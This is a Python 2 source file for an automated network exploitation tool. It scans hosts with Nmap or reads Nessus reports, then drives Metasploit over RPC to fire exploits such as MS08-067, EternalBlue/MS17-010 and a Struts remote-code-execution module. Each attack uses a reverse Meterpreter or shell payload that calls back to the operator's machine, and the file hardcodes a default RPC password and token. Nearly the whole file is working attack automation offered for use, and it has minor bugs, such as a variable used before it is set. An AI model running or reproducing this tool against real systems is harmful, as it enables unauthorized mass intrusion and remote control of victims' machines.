#!/usr/bin/env python2

import re
import os
import sys
import time
import msfrpc
import argparse
import netifaces
from IPython import embed
from termcolor import colored
from libnmap.process import NmapProcess
from libnessus.parser import NessusParser
from netaddr import IPNetwork, AddrFormatError
from subprocess import Popen, PIPE, CalledProcessError
from libnmap.parser import NmapParser, NmapParserException
from libnessus.parser import NessusParser

CLIENT = msfrpc.Msfrpc({})

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-p", "--password", default='Au70PwN', help="Password for msfrpc")
    parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
    parser.add_argument("-x", "--xml", help="Nmap XML file")
    parser.add_argument("-n", "--nessus", help="Nessus .nessus file")
    parser.add_argument("--nmap-args", help='Additional Nmap args, e.g. --nmap-args="--top-ports 1000 --max-rtt-timeout 300"')
    return parser.parse_args()

# Colored terminal output
def print_bad(msg):
    print(colored('[-] ', 'red') + msg)

def print_info(msg):
    print(colored('[*] ', 'blue') + msg)

def print_good(msg):
    print(colored('[+] ', 'green') + msg)

def print_great(msg):
    print(colored('[!] {}'.format(msg), 'yellow', attrs=['bold']))

def run_proc(cmd):
    '''
    Runs single commands
    '''
    cmd_split = cmd.split()
    print_info('Running: {}'.format(cmd))
    proc = Popen(cmd_split, stdout=PIPE, stderr=PIPE)

    return proc

def get_exploitable_hosts(report):
    '''
    Parses .nessus files for vulnerabilities that metasploit can exploit
    '''
    exploits = {}

    for i in report.hosts:
        operating_sys = i.get_host_properties['operating-system']
        rep_items = i.get_report_items
        for x in rep_items:
            vuln_info = x.get_vuln_info
            severity = x.severity
            if int(severity) > 2:
                if vuln_info.get('exploit_framework_metasploit'):
                    if vuln_info['exploit_framework_metasploit'] == 'true':
                        ip = i.address
                        port = vuln_info['port']
                        msf_mod = vuln_info['metasploit_name']
                        print_good('Found vulnerable host! {}:{} - {}'.format(ip, port, msf_mod))

                        if exploits.get(msf_mod):
                            exploits[msf_mod].append((ip, port))
                        else:
                            exploits[msf_mod] = [(operating_sys, ip, port)]

    return exploits

def parse_nmap(args):
    '''
    Either performs an Nmap scan or parses an Nmap xml file
    Will either return the parsed report or exit script
    '''
    if args.xml:
        try:
            report = NmapParser.parse_fromfile(args.xml)
        except IOError:
            print_bad('Host file not found: {}'.format(args.xml))
            sys.exit()

    elif args.hostlist:
        hosts = []
        with open(args.hostlist, 'r') as hostlist:
            host_lines = hostlist.readlines()
            for line in host_lines:
                line = line.strip()
                try:
                    if '/' in line:
                        hosts += [str(ip) for ip in IPNetwork(line)]
                    elif '*' in line:
                        print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24')
                        sys.exit()
                    else:
                        hosts.append(line)
                except (OSError, AddrFormatError):
                    print_bad('Error importing host list file. Are you sure you chose the right file?')
                    sys.exit()

        report = nmap_scan(hosts, args.nmap_args)

    else:
        print_bad('Specify hostlist with: -l <hostlist.txt>')
        sys.exit()

    return report

def nmap_scan(hosts, add_args):
    '''
    Do Nmap scan
    '''
    #nmap_args = '-sS -T4 -sV -n --max-retries 5 -oA autopwn-scan'
    nmap_args = '-sS -O -T4 -sV -n {} --max-retries 5 -oA autopwn-scan'.format(add_args)
    print_info('Running: nmap {}'.format(nmap_args))
    nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
    rc = nmap_proc.sudo_run_background()
    nmap_status_printer(nmap_proc)
    report = NmapParser.parse_fromfile(os.getcwd()+'/autopwn-scan.xml')

    return report

def nmap_status_printer(nmap_proc):
    '''
    Prints that Nmap is running
    '''
    i = -1
    x = -.5
    while nmap_proc.is_running():
        i += 1
        # Every 30 seconds print that Nmap is still running
        if i % 30 == 0:
            x += .5
            print_info("Nmap running: {} min".format(str(x)))

        time.sleep(1)

def get_hosts(report):
    '''
    Prints host data
    '''
    hosts = []

    print_info('Parsing hosts')
    for host in report.hosts:
        if host.is_up():
            ip = host.address
            nmap_os_raw = host.os_class_probabilities()

            if len(nmap_os_raw) > 0:
                nmap_os = str(nmap_os_raw[0]).split(':')[1].split('\r\n')[0].strip()
            else:
                # Default to Windows
                nmap_os = '?'

            print_info('{} - {}'.format(ip, nmap_os))
            for s in host.services:
                if s.open():

                    if host not in hosts:
                        hosts.append(host)

                    if 'product: ' in s.banner:
                        banner = s.banner.split('product: ')[1]
                    else:
                        banner = s.banner

                    port = str(s.port)
                    print '          {} - {}'.format(port, banner)

    if len(hosts) == 0:
        print_bad('No hosts found')
        sys.exit()

    return hosts

def check_named_pipes(c_id, ip, nmap_os):
    '''
    If we can avoid EternalBlue we will because EternalRomance/Synergy
    works on more versions of Windows
    If we can get a named pipe then we'll use Romance/Synergy over Blue
    '''
    pipes = None
    path = 'auxiliary/scanner/smb/pipe_auditor'
    rhost_var = get_rhost_var(c_id, path)
    port = '445'
    opts = ''
    payload = get_payload(path, nmap_os)
    cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
    mod_out = run_console_cmd(c_id, cmd)

    # Example output:
    '''
    ['RHOSTS => 192.168.243.129',
       '[*] 192.168.243.129:445   - Pipes: \\netlogon, \\lsarpc, \\samr, \\atsvc, \\epmapper, \\eventlog, \\InitShutdown, \\lsass, \\LSM_API_service, \\ntsvcs, \\protected_storage, \\scerpc, \\srvsvc, \\W32TIME_ALT, \\wkssvc',
       '[*] Scanned 1 of 1 hosts (100% complete)',
       '[*] Auxiliary module execution completed']
    '''

    for l in mod_out:
        delim = 'Pipes: '
        if delim in l:
            pipes = l.split(delim)[1].split(', ')

    return pipes

def get_iface():
    '''
    Gets the right interface for Responder
    '''
    try:
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    except:
        ifaces = []
        for iface in netifaces.interfaces():
            # list of ipv4 addrinfo dicts
            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo') or addr.startswith('127.')):
                    ifaces.append(iface)

        iface = ifaces[0]

    return iface

def get_local_ip(iface):
    '''
    Gets the the local IP of an interface
    '''
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip

def create_msf_cmd(module_path, rhost_var, ip, port, payload, extra_opts):
    '''
    You can set arbitrary options that don't get used which is why we autoinclude
    ExitOnSession True; even if we use aux module this just won't do anything
    '''
    local_ip = get_local_ip(get_iface())
    print_info('Setting options on {}'.format(module_path))
    cmds = """
           use {}\n
           set {} {}\n
           set RPORT {}\n
           set LHOST {}\n
           set payload {}\n
           {}\n
           set ExitOnSession True\n
           """.format(module_path, rhost_var, ip, port, local_ip, payload, extra_opts)

    return cmds

def run_console_cmd(c_id, cmd):
    '''
    Runs module and gets output
    '''
    print_info('Running MSF command(s):')
    for l in cmd.splitlines():
        l = l.strip()
        if l != '':
            print_info('    {}'.format(l))
    print ''
    CLIENT.call('console.write',[c_id, cmd])
    time.sleep(3)
    mod_output = wait_on_busy_console(c_id)
    print ''

    return mod_output

def get_req_opts(c_id, module):
    req_opts = []
    opts = CLIENT.call('module.options', [c_id, module])
    print_info('Required options:')
    for opt_name in opts:
        if opts[opt_name].get('required'):
            if opts[opt_name]['required'] == True:
                if 'default' not in opts[opt_name]:
                    req_opts.append(opt_name)
                    print('    {}'.format(opt_name))
    return req_opts

def get_rhost_var(c_id, module):
    req_opts = get_req_opts(c_id, module)
    for o in req_opts:
        if 'RHOST' in o:
            return o
    print_bad('Could not get RHOST var')
    print_bad('List of required options:')
    for o in req_opts:
        print_info(o)

def get_payload(module, operating_sys):
    '''
    Automatically get compatible payloads
    '''
    payload = None
    win_payloads = ['windows/meterpreter/reverse_https',
                    'windows/x64/meterpreter/reverse_https',
                    'java/meterpreter/reverse_https',
                    'java/jsp_shell_reverse_tcp']

    unix_payloads = ['java/meterpreter/reverse_https',
                     'java/jsp_shell_reverse_tcp',
                     'cmd/unix/reverse']

    payloads = CLIENT.call('module.compatible_payloads',[module])

    if payloads.get('error'):
        if 'auxiliary' not in module:
            print_bad('Error getting payload for {}'.format(module))
        else:
            # For aux modules we just set an arbitrary real payload
            payload = win_payloads[0]
    else:
        payloads = payloads['payloads']

    # Set a preferred payload based on OS
    if 'windows' in operating_sys.lower():
        for p in win_payloads:
            if p in payloads:
                payload = p
    elif 'nix' in operating_sys.lower():
        for p in win_payloads:
            if p in payloads:
                payload = p

    # No preferred payload found. If aux module, just set it to rev_https bc it doesn't matter
    if payload == None:
        if 'auxiliary' not in module:
            print_bad('No preferred payload found, here\'s what was found:')
            for p in payloads:
                print '    '+p
            print_info('Skipping this exploit')
            return
            #print_info('Setting payload to {} and continuing'.format(payloads[0]))

        payload = win_payloads[0]

    return payload

def check_nse_vuln_scripts(host, script):
    '''
    Check if host if vulnerable via nse script
    '''
    ip = host.address
    for script_out in host.scripts_results:
        if script_out['id'] == script:
            if 'State: VULNERABLE' in script_out['output']:
                print_good('NSE script {} found vulnerable host: {}'.format(script, ip))
                return True

    return False

def check_vuln(c_id):
    '''
    Check if the machine is vulnerable
    '''
    # potential messages:
    # Check failed: ..."
    # Cannot reliably check exploitability
    cmd = 'check\n'
    out = run_console_cmd(c_id, cmd)
    not_sure_msgs = ['Cannot reliably check exploitability', 'The state could not be determined']
    if out:
        for l in out:
            if 'is vulnerable' in l:
                print_good('Vulnerable!')
                return True
            elif any(x in l for x in not_sure_msgs):
                print_info('Unsure if vulnerable, continuing with exploit')
                return True

    return False

def run_nessus_exploits(c_id, exploits):
    # There might be a better way to do this but idk it
    # The way MSF search works is with an OR in between words even wrapped in quotes
    # ... dumb.
    print_info("Collecting list of all Metasploit modules...")
    all_mods = CLIENT.call('module.search', ['a e i o u'])
    for mod_desc in exploits:

        # convert mod_desc into mod_path
        path = None
        for mod in all_mods:
            if mod['name'] == mod_desc:
                path = mod['fullname']
                print_info('Using module {}'.format(path))
        if not path:
            print_bad('Error finding module with description: {}'.format(mod_desc))
            continue

        for operating_sys, ip, port in exploits[mod_desc]:
            payload = get_payload(path, operating_sys)
            if not payload:
                continue
            rhost_var = get_rhost_var(c_id, path)
            opts = ''
            cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
            settings_out = run_console_cmd(c_id, cmd)
            print_info('Checking if host is vulnerable...')
            output = run_if_vuln(c_id, cmd)

def run_nmap_exploits(c_id, hosts):
    '''
    Checks for exploitable services on a host
    '''
    for host in hosts:
        # First check for ms08_067 and ms17_010
        ms08_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms08-067')
        ms17_vuln = check_nse_vuln_scripts(host, 'smb-vuln-ms17-010')
        if ms08_vuln == True:
            mod_output = run_ms08(c_id, host)
        if ms17_vuln == True:
            mod_output = run_ms17(c_id, host)

        for s in host.services:
            if s.open():
                if 'Apache Tomcat/Coyote JSP engine version: 1.1' in s.banner:
                    port = str(s.port)
                    mod_output = run_struts_dmi_rest_exec(c_id, host, port)

def run_if_vuln(c_id, cmd):
    is_vulnerable = check_vuln(c_id)
    if is_vulnerable == True:
        exploit_cmd = 'exploit -z\n'
        mod_out = run_console_cmd(c_id, exploit_cmd)

        return mod_out

def run_struts_dmi_rest_exec(c_id, host, port):
    path = 'exploit/multi/http/struts_dmi_rest_exec'
    ip = host.address
    rhost_var = get_rhost_var(c_id, path)
    opts = ''
    nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
    payload = get_payload(path, nmap_os)
    cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
    settings_out = run_console_cmd(c_id, cmd)
    print_info('Checking if host is vulnerable...')
    output = run_if_vuln(c_id, cmd)
    return output

def run_ms08(c_id, host):
    '''
    Exploit ms08_067
    '''
    path = 'exploit/windows/smb/ms08_067_netapi'
    ip = host.address
    nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
    port = '445'
    rhost_var = get_rhost_var(c_id, path)
    opts = ''
    payload = get_payload(path, nmap_os)
    cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
    settings_out = run_console_cmd(c_id, cmd)
    print_info('Checking if host is vulnerable...')
    output = run_if_vuln(c_id, cmd)
    return output

def run_ms17(c_id, host):
    '''
    Exploit ms17_010
    '''
    ip = host.address
    nmap_os = str(host.os_class_probabilities()[0]).split(':')[1].split('\r\n')[0].strip()
    port = '445'
    rhost_var = get_rhost_var(c_id, path)
    opts = ''

    # Check for named pipe availability (preVista you could just grab em)
    # If we find one, then use Romance/Synergy instead of Blue
    named_pipe = None
    named_pipes = check_named_pipes(c_id, ip, nmap_os)

    # Just use the first named pipe
    if named_pipes:
        print named_pipes #1111
        print_good('Named pipe found! Performing more reliable ms17_010_psexec instead of eternalblue')
        named_pipe = named_pipes[0]
        path = 'exploit/windows/smb/ms17_010_psexec'
        opts = 'set NAMEDPIPE {}'.format(named_pipe)
    else:
        print_info('Named pipe not found. Performing ms17_010_eternalblue')
        path = 'exploit/windows/smb/ms17_010_eternalblue'
        opts = 'set MaxExploitAttempts 6'

    payload = get_payload(path, nmap_os)
    cmd = create_msf_cmd(path, rhost_var, ip, port, payload, opts)
    settings_out = run_console_cmd(c_id, cmd)
    print_info('Checking if host is vulnerable...')
    output = run_if_vuln(c_id, cmd)
    return output

def print_cur_output(c_id):
    output = []
    cur_output = CLIENT.call('console.read', [c_id])['data'].splitlines()
    for l in cur_output:
        l = l.strip()
        if l != '':
            output.append(l)
            if re.search('Session . created in the background', l):
                print ''
                print_great(l)
            else:
                print '    '+l

    return output

def wait_on_busy_console(c_id):
    '''
    The only way to get console busy status is through console.read or console.list
    console.read clears the output buffer so you gotta use console.list
    but console.list requires you know the list offset of the c_id console
    so this ridiculous list comprehension seems necessary to avoid assuming
    what the right list offset might be
    '''
    output = []
    list_offset = int([x['id'] for x in CLIENT.call('console.list')['consoles'] if x['id'] is c_id][0])
    # Get any initial output
    cur_out = print_cur_output(c_id)
    output += cur_out
    while CLIENT.call('console.list')['consoles'][list_offset]['busy'] == True:
        cur_out = print_cur_output(c_id)
        output += cur_out
        time.sleep(1)

    # Get remaining output
    cur_out = print_cur_output(c_id)
    output += cur_out

    return output

def main(report, args):
    global CLIENT

    # Authenticate and grab a permanent token
    CLIENT.login(args.username, args.password)
    CLIENT.call('auth.token_add', ['Au70PwN'])
    CLIENT.token = 'Au70PwN'

    c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]

    if len(c_ids) == 0:
        CLIENT.call('console.create')
        c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]
        # Wait for response
        time.sleep(2)

    # Get the latest console
    c_id = c_ids[-1]

    if args.nessus:
        # exploits = {'msf_module_name':[(ip, port), (ip, port)]
        exploits = get_exploitable_hosts(report)
        run_nessus_exploits(c_id, exploits)
        remainder_output = wait_on_busy_console(c_id)
    else:
        # hosts = {ip : [(port, banner), (port2, banner2)]
        hosts = get_hosts(report)
        run_nmap_exploits(c_id, hosts)
        remainder_output = wait_on_busy_console(c_id)

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid():
        print_bad('Run as root')
        sys.exit()
    if args.nessus:
        report = NessusParser.parse_fromfile(args.nessus)
    else:
        report = parse_nmap(args)
    main(report, args)

#TODO
# Add JBoss, Struts, Tomcat, Jenkins, WebSphere
# Add nmap script scan only after port is found
